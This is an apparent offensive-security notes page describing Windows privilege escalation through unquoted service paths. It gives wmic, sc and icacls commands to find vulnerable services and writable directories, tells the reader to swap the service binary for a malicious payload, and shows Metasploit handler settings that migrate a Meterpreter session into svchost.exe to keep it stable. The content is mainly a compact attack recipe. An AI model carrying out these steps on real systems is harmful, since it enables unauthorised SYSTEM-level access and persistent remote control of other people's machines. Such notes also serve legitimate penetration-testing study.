# d - Unqouted Service Paths

### Steps to perform the exploit

{% embed url="https://www.ired.team/offensive-security/privilege-escalation/environment-variable-path-interception" %}

`wmic service get name,displayname, pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """` -search for services with Unquuoted paths.

`sc stop <service_name>` - check if the user can stop and start the program 1st without any errors, then

`sc qc <service_name>` - check if the service will start as the LOCAL SYSTEM account.&#x20;

`icacls "dir_name"`  - check the permission of the directory you will write the payload into if the user has modification permission. If all goes well you can go ahead and replace the binary with a malicious payload.

### How to make a Meterpreter Session stable

Sometimes when you successfully get a meterpreter session, it might crash iimmediately, we can remedy this by launching our handler with the "auto run script" as an additional option to our handler we will use the "set auto run script" option with the "migrate" cmd and the "-" and parameter to migrate our payload to an existing "svchost.exe" process, this should give our payload some stability (stable meterpreter / stabel session) and allow us to interact with it.

```bash
msf> use multi/handler
msf> set AutoRunScript migrate -n svchost.exe
msf> set LHOST and LPORT, PAYLOAD then run.
```
